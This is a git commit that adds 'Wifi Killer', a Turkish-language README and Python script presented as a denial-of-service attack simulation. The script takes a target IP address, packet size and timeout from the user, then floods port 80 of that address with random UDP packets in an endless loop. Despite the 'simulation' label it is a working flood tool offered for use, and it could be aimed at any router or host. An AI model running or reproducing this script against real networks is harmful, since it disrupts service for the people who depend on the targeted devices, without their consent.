171a66b5eee48b7bd6fb1157f9d91cfea0b15a3c
Muhammet Emirhan <esumer777@gmail.com>
2024-09-04 10:07:13 +0300

    Wifi Killer DoS Attack

---
+++ README.md
@@ -0,0 +1,33 @@
+
+# Wifi Killer
+
+Bu proje, bir ağ saldırı simülasyonu (DoS - Denial of Service) gerçekleştirmek amacıyla yazılmış bir Python scriptidir. Amacı, hedef alınan modemin IP adresine büyük miktarda veri paketi göndererek, hedef cihazın veya ağın normal çalışmasını aksatmak ya da durdurmaktır.
+
+
+
+## Bilgisayarınızda Çalıştırın
+
+Projeyi klonlayın
+
+```bash
+  git clone https://github.com/memirhan/WifiKiller
+```
+
+Proje dizinine gidin
+
+```bash
+  cd WifiKiller
+```
+
+Programı Çalıştırın
+
+```bash
+  python wifikiller.py
+```
+
+  
+## Dipnot
+
+Bu proje, zaman kısıtlamaları nedeniyle aceleyle hazırlanmış olup, detaylı bir geliştirme süreci geçirilmemiştir. Bu nedenle, hem kod kalitesi hem de işlevsellik açısından birçok iyileştirme potansiyeli barındırmaktadır. Proje, daha fazla geliştirilip optimize edilebilir; ek güvenlik önlemleri, hata ayıklama mekanizmaları ve kullanıcı dostu özellikler eklenebilir. Ayrıca, ileriye dönük olarak saldırı simülasyonunun daha gerçekçi ve kontrollü bir şekilde gerçekleştirilmesi için çeşitli optimizasyonlar ve yeni özellikler eklenebilir.
+
+  
---
+++ wifikiller.py
@@ -0,0 +1,94 @@
+import socket
+import time
+import random
+
+import colorama
+from colorama import Fore, Style
+
+colorama.init()
+
+RED = Fore.RED
+GREEN = Fore.GREEN
+ORANGE = Fore.LIGHTYELLOW_EX
+YELLOW = Fore.YELLOW
+PURPLE = Fore.BLUE
+CYAN = Fore.CYAN
+RESET = Style.RESET_ALL
+
+print(r"""       
+| |  | (_)/ _(_)  | | / (_) | |          
+| |  | |_| |_ _   | |/ / _| | |1.0_______ 
+| |/\| | |  _| |  |    \| | | |/ _ \ '__|
+\  /\  / | | | |  | |\  \ | | |  __/ |   
+ \/  \/|_|_| |_|  \_| \_/_|_|_|\___|_|
+                  {}github.com/memirhan{}
+ """.format(GREEN, RESET))
+
+targetIp = input(f"Modeminizin IP adresinizi giriniz {GREEN}(default 192.168.1.1){RESET}: ")
+packetByte = int(input(f"Gönderilecek her bir paketin boyutunu giriniz {GREEN}(max 4096){RESET}: "))
+timeOut = input("Timeout değeri veriniz (örnek 0.001): ").replace(",", ".")
+timeOut = float(timeOut)
+targetPort = 80
+
+resultTime = 0
+
+while True:
+    if packetByte <= 4096:
+        if not targetIp:
+            targetIp = "192.168.1.1"
+
+        print("------------------------------------")
+        print(f"{ORANGE}Modem IP Adresi{RESET}: ", targetIp)
+        print("------------------------------------")
+        print(f"{ORANGE}Her bir paketin boyutu:  {RESET}: ", packetByte)
+        print("------------------------------------\n")
+
+        packet = random._urandom(packetByte)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        sendPacket = 0
+        clock = 0
+
+        attackConfirm = input("Atak Başlatılsınmı? (evet/hayır): ")
+        if attackConfirm == "evet":
+            try:
+                print(f"\n{RED}Saldırı Başlatıldıs...\n")
+                attackStartTime = time.time()
+
+                counter = 0
+
+                while True:
+                    sock.sendto(packet, (targetIp, targetPort))
+                    sendPacket += 1
+                    time.sleep(timeOut)
+
+                    attackFinishTime = time.time()
+                    resultTime = int(attackFinishTime - attackStartTime)
+
+                    counter += timeOut
+
+                    if counter >= 10:
+                        print(f"{CYAN}Geçen süre: {resultTime} saniye{RESET}")
+                        counter = 0
+
+            except KeyboardInterrupt:
+                print(f"\n{YELLOW}Saldırı durduruldu.{RESET}")
+
+            except OSError:
+                print(f"{RED}Bir hata oluştu. Saldırı durduruldu.{RESET}")
+                break
+
+            except ValueError:
+                print("??????????????????????????????????")
+
+        elif attackConfirm == "hayır":
+            print("Atak sonlandırılıyor...")
+            break
+
+        else:
+            print("Geçerli bir seçim yapınız (evet/hayır): ")
+
+    else:
+        print(f"\n{RED}Hata{RESET}\n")
+        packetByte = int(input(f"Gönderilecek paketin boyutunu küçültünüz {GREEN}(max 4096){RESET}: "))
+        print(" ")
